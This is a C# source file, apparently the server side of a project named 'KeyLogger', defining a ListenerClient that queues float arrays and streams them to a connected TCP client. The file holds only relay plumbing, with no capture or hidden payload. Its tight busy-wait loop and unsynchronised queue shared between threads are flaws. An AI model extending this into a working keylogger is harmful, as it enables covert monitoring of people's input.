using System.Net.Sockets;
using System.Threading.Tasks;
using System;
using System.Collections.Generic;
using KeyLogger.Protocol;

namespace KeyLogger.Server
{
    public class ListenerClient : Client
    {
        private bool _run;
        private Queue<float[]> _dataQueue;

        public ListenerClient(TcpClient tcpClient)
            : base(tcpClient)
        {
            _dataQueue = new Queue<float[]>();
        }

        public override Task Run()
        {
            return Task.Run(() =>
            {
                Console.WriteLine("[Listener] Started");
                _run = true;
                while (_run)
                {
                    if (_dataQueue.Count > 0)
                    {
                        Console.WriteLine("[Listener] Sending data");
                        new DataMessage(_dataQueue.Dequeue()).Send(TcpClient.GetStream());
                    }
                }
            });
        }

        public void Send(float[] data)
        {
            _dataQueue.Enqueue(data);
        }

        public void Close()
        {
            _run = false;
        }

        public override string ToString()
        {
            return "Listener client";
        }
    }
}